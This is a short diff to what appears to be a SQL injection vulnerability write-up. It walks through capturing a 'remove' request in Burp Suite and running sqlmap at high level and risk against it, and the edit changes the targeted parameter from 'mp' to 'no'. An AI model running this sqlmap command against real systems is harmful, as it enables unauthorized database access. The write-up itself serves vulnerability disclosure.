@@ -24,7 +24,7 @@ Click on `remove` and intercept the traffic using Burp Suite:
 
 ![Screenshot from 2024-10-26 14-35-26](https://github.com/user-attachments/assets/d1d3fbcd-c56c-494f-9a1c-0f21dce1d724)
 
-Now copy-paste the traffic and save it in to `remove_project.req` and run `sqlmap` against it: `sqlmap -r remove_project.req --batch --dbms mysql --level 5 --risk 3 -p mp`
+Now copy-paste the traffic and save it in to `remove_project.req` and run `sqlmap` against it: `sqlmap -r remove_project.req --batch --dbms mysql --level 5 --risk 3 -p no`
 
 `sqlmap` automatically exploits the vulnerability:
 
